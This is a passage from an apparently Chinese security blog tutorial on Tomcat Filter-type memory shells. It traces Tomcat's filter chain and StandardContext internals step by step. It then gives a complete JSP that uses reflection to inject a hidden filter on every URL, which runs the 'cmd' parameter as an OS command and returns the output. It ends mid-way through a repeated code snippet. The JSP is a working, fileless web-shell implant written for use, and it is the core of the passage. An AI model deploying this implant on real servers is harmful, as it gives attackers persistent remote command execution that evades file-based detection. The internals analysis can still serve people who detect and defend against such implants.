class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--过滤器配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.tomcat_demo_neicunma.filterdemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/test<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-1-1访问filter之后的调用">2.1.1访问filter之后的调用</h4><p>然后我们直接打一个断点在dofilter中</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917345344-c615db5b-5552-46c8-b904-82c3c661b110.png" alt=""></p><p>开启调试，这里推荐看tomcat的分析，可以很详细的了解清楚在filter之后流程调用是怎么运行的。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917494259-a9cd4aba-ea46-4903-a647-f67f2bf94f25.png" alt=""></p><p>这里我们自己跟跟跟进filter会进入ApplicationFilterChain类里的dofilter方法这里的Globals.IS_SECURITY_ENABLED，也就是全局安全服务是否开启的判断。</p><p>我们继续跟他会调用else里面的internalDoFilter方法跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917709111-550f931f-688f-4522-a9dd-c8350153b017.png" alt=""></p><p>主要是要看一下这个filters</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715917971557-6099595a-2995-45aa-8a8f-c5810d4b8060.png" alt=""></p><p>这里这个filters主要是用来存储我们自定义的filter对象和tomcat自带的filter的。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715918131371-6d827c6e-0ff0-4325-ae1a-14e6341be117.png" alt=""></p><p>继续往下跟进发下获取出数组里的filter 然后调用filter的dofilter方法。然后我们在继续跟进的时候发现又会调用到ApplicationFilterChain类里的dofilter方法，这里可以去网上查一查具体我就不在继续跟了，自己解释一下就是filter是一条链会一个个获取filter然后执行filter里面dofilter方法直到最后一个</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715918429489-5ad797a6-55ef-4262-87ea-642724d5b8ec.png" alt=""></p><p>最后会调用到这里去调用servlet。</p><p>:::tips<br>最后一个 filter 调用 servlet 的 service 方法</p><p>上一个 Filter.doFilter() 方法中调用 FilterChain.doFilter() 方法将调用下一个 Filter.doFilter() 方法；这也就是我们的 Filter 链，是去逐个获取的。</p><p>最后一个 Filter.doFilter() 方法中调用的 FilterChain.doFilter() 方法将调用目标 Servlet.service() 方法。</p><p>只要 Filter 链中任意一个 Filter 没有调用 FilterChain.doFilter() 方法，则目标 Servlet.service() 方法都不会被执行。</p><p>至此，我们的正向分析过程就结束了，得到的结论是 Filter Chain 的调用结构是一个个 doFilter() 的，最后一个 Filter 会调用 Servlet.service()</p><p>:::</p><p>这里参考：<a href="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#%E5%9C%A8%E8%AE%BF%E9%97%AE-x2F-filter-%E4%B9%8B%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#%E5%9C%A8%E8%AE%BF%E9%97%AE-x2F-filter-%E4%B9%8B%E5%90%8E%E7%9A%84%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90</a>这个文章的解释</p><h4 id="2-1-2访问filter之前的调用">2.1.2访问filter之前的调用</h4><p>还是同样的我们直接在自定义的dofilter方法里下一个断点然后看看是谁调用了该方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715927482149-3028d7cf-1a48-428b-b3d2-3808f25bc1df.png" alt=""></p><p>通过idea的调用栈以及参考网上的分析可以看到是ApplicationFilterChain的internalDoFilter方法中调用了我们自定义的filter方法，然后继续向上寻找发现是ApplicationFilterChain下的doFilter调用了该方法，再接着向上寻找调用栈发现StandardWrapperValve类里面的invoke方法中的filterchain调用了doFilter方法<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715927708397-b995071b-016d-45ab-bba9-59a7eeb08821.png" alt=""></p><p>那我们继续看这个filterChain是什么</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715927790744-70dd872e-e8ea-4926-b082-ac6e10378545.png" alt=""></p><p>往上翻可以看到是ApplicationFilterChain调用了createFilterChain方法复值给 filterchain跟进这个方法看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715928219779-74b1503a-3823-4298-8921-2513e2bc93c0.png" alt=""></p><p>下面比较重要的就是箭头所指出的两个方法，获取filterMaps（filterMap 主要存放了过滤器的名字以及作用的</p><p>url）如下图所示</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715928697066-2bdcfe9c-ac70-48eb-9541-82afdd287bda.png" alt=""></p><p>然后有一个判断如果我们没有编写filter方法也就是没在web.xml文件中配置filter对象、路径等等之类的，就直接返回filterchain对象去调用后面的servlet。</p><p>如果不为空的话就遍历 FilterMaps 中的 FilterMap，如果发现符合当前请求 url 与 FilterMap 中的 urlPattern 想匹配，就会进入 if 判断会调用 findFilterConfig 方法在 filterConfigs 中寻找对应 filterName名称的FilterConfig，然后如果不为null，就进入 if 判断，将 filterConfig 添加到 filterChain中，看一下filterconfig数组属性包含filterdef、filter等</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929629775-79499f1a-8dbd-4489-a920-8334b459c638.png" alt=""></p><p>跟进addFilter函数</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929050800-9193fcf4-8ada-47a0-a15e-6546a5f7dfe1.png" alt=""></p><p>在addFilter函数中首先会遍历filters，判断我们的filter是否已经存在（其实就是去重）</p><p>下面这个 if 判断其实就是扩容，如果 n 已经等于当前 filters 的长度了就再添加10个容量，最后将我们的filterConfig 添加到 filters中</p><p>到这里其实就是相当于跟完了filter的整个调用链。来一张经典图</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929580462-30056289-bc45-487f-812c-711f5bf1841e.png" alt=""></p><p>通过上面的思考我们能够想到如果我们想要插入一个内存马的关键点就在于StandardContext.findFilterMaps()和StandardContext.findFilterConfig()，我们可以来看看这2个方法的实现，可以看到都是直接从StandardContext中取到对应的属性，那么我们只要往这2个属性里面插入对应的filterMap和filterConfig即可实现动态添加filter的目的:</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929736823-1afa3139-43d7-4ca1-915f-51a858d9a758.png" alt=""><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929765876-047ada2d-7513-4fca-98e0-392259120db5.png" alt=""></p><p>实际上StandardContext也有一些方法可以帮助我们添加属性。首先我们来看filtermaps，StandardContext直接提供了对应的添加方法(Before是将filter放在首位，正是我们需要的)，</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932382974-a7004554-d8c8-47f2-96de-82d6e91534f9.png" alt=""></p><p>这里再往filterMaps添加之前会有一个校验filtermap是否合法的操作，跟进validateFilterMap.</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932487587-2eb1b420-300c-41ba-b9fa-1620ece24326.png" alt=""></p><p>红色箭头所指的地方可以看到调用了findFilterDef方法闯入filtername跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932592404-eacd9c7b-a606-48a0-b606-068f710f604a.png" alt=""></p><p>可以看到会根据filtename去寻找对应的filterdef如果没找到为空的话会报异常错误，所以我们除了往filterMap和filterConfig添加filter以外还向filterdef中添加filter的相关属性不过StandardContext直接提供了对应的添加方法:</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932861209-3a0794fd-9fc4-4759-ad13-f59bd17d1afa.png" alt=""></p><p>最后我们再来看filterConfigs，根据命名规则搜索addFilterConfig，发现并没有这个方法，所以我们考虑要通过反射的方法手动获取属性并添加:<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715934494968-409c996f-6aec-468b-9196-3739b46963e3.png" alt=""></p><p>:::tips<br>这里做一个简单的总结：</p><p>1.根据请求的 URL 从 FilterMaps 中找出与之 URL 对应的 Filter 名称</p><p>2.根据 Filter 名称去 FilterConfigs 中寻找对应名称的 FilterConfig</p><p>3.找到对应的 FilterConfig 之后添加到 FilterChain中，并且返回 FilterChain</p><p>4.filterChain 中调用 internalDoFilter 遍历获取 chain 中的 FilterConfig ，然后从 FilterConfig 中获取 Filter，然后调用 Filter 的 doFilter 方法</p><p>根据上面的简单总结，不难发现最开始是从 context 中获取的 FilterMaps，将符合条件的依次按照顺序进行调用，那么我们可以将自己创建的一个 FilterMap 然后将其放在 FilterMaps 的最前面，这样当 urlpattern 匹配的时候就回去找到对应 FilterName 的 FilterConfig ，然后添加到 FilterChain 中，最终触发我们的内存shell</p><p>:::</p><p>参考：<a href="http://wjlshare.com/archives/1529">http://wjlshare.com/archives/1529</a></p><h4 id="2-1-3关于StandardContext、ApplicationContext、ServletContext">2.1.3关于StandardContext、ApplicationContext、ServletContext</h4><p>:::tips<br>通过上面总结及分析发现我们想要注入filter内存马需要获取standardcontex对象才能调用其中的方法进行注入。</p><p>这里直接复制别的师傅</p><p>关于StandardContext、ApplicationContext、ServletContext的理解</p><p>请参考Skay师傅和yzddmr6师傅的文章，他们写的非常详细，这里直接贴出链接：</p><p><a href="https://yzddmr6.com/posts/tomcat-context/">https://yzddmr6.com/posts/tomcat-context/</a></p><p><a href="https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew">https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew</a></p><p>引用Skay师傅的一句话总结：</p><p>ServletContext是Servlet规范；org.apache.catalina.core.ApplicationContext是ServletContext的实现；org.apache.catalina.Context接口是tomcat容器结构中的一种容器，代表的是一个web应用程序，是tomcat独有的，其标准实现是org.apache.catalina.core.StandardContext，是tomcat容器的重要组成部分。</p><p>关于StandardContext的获取方法，除了本文中提到的将我们的ServletContext转为StandardContext从而获取context这个方法，还有以下两种方法：</p><p>从线程中获取StandardContext，参考Litch1师傅的文章：<a href="https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A">https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A</a></p><p>从MBean中获取，参考54simo师傅的文章：<a href="https://scriptboy.cn/p/tomcat-filter-inject/">https://scriptboy.cn/p/tomcat-filter-inject/</a>，不过这位师傅的博客已经关闭了，我们可以看存档：<a href="https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/">https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/</a></p><p>从spring运行时的上下文中获取，参考 LandGrey@奇安信观星实验室 师傅的文章：<a href="https://www.anquanke.com/post/id/198886">https://www.anquanke.com/post/id/198886</a></p><p>:::</p><h5 id="2-1-3-1编写demo">2.1.3.1编写demo</h5><p>:::tips<br>如果我们想要写一个Filter内存马，需要经过以下步骤：</p><p>参考：<a href="https://longlone.top/">https://longlone.top/</a>安全/java/java安全/内存马/Tomcat-Filter型/</p><p>获取StandardContext；</p><p>继承并编写一个恶意filter；</p><p>实例化一个FilterDef类，包装filter并存放到StandardContext.filterDefs中；</p><p>实例化一个FilterMap类，将我们的Filter和urlpattern相对应，使用addFilterMapBefore存放到StandardContext.filterMaps中；</p><p>通过反射获取filterConfigs，实例化一个FilterConfig（ApplicationFilterConfig）类，传入StandardContext与filterDefs，存放到filterConfig中。</p><p>参考：<a href="https://tyaoo.github.io/2021/12/06/Tomcat">https://tyaoo.github.io/2021/12/06/Tomcat</a>内存马/</p><p>需要注意的是，一定要先修改filterDef，再修改filterMap，不然会抛出找不到filterName的异常。</p><p>:::</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> getRandomString();</span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;cmd /c &quot;</span> + cmd).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(filterName);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(filterName);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">        filterConfigs.put(filterName, applicationFilterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Malicious filter injection successful!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Filter name: &quot;</span> + filterName + <span class="string">&quot;&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Below is a list displaying filter names and their corresponding URL patterns:&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;tr&gt;&lt;th&gt;Filter Name&lt;/th&gt;&lt;th&gt;URL Patterns&lt;/th&gt;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">        List&lt;String[]&gt; allUrlPatterns = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Object filterConfigObj : filterConfigs.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (filterConfigObj <span class="keyword">instanceof</span> ApplicationFilterConfig) &#123;</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) filterConfigObj;</span><br><span class="line">                <span class="type">String</span> <span class="variable">filtername</span> <span class="operator">=</span> filterConfig.getFilterName();</span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterdef</span> <span class="operator">=</span> standardContext.findFilterDef(filtername);</span><br><span class="line">                <span class="keyword">if</span> (filterdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                    FilterMap[] filterMaps = standardContext.findFilterMaps();</span><br><span class="line">                    <span class="keyword">for</span> (FilterMap filtermap : filterMaps) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (filtermap.getFilterName().equals(filtername)) &#123;</span><br><span class="line">                            String[] urlPatterns = filtermap.getURLPatterns();</span><br><span class="line">                            allUrlPatterns.add(urlPatterns); <span class="comment">// 将当前迭代的urlPatterns添加到列表中</span></span><br><span class="line"></span><br><span class="line">                            out.println(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> + filtername + <span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                            out.println(<span class="string">&quot;&lt;td&gt;&quot;</span> + String.join(<span class="string">&quot;, &quot;</span>, urlPatterns) + <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/table&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String[] urlPatterns : allUrlPatterns) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String pattern : urlPatterns) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!pattern.equals(<span class="string">&quot;/*&quot;</span>)) &#123;</span><br><span class="line">                    out.println(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;shell: http://localhost:8080/test&quot;</span> + pattern + <span class="string">&quot;?cmd=ipconfig&lt;br&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getRandomString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">characters</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">randomString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * characters.length());</span><br><span class="line">            randomString.append(characters.charAt(index));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> randomString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这里需要分析一下context是如何获取的。直接参考W01fh4cker师傅的分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) 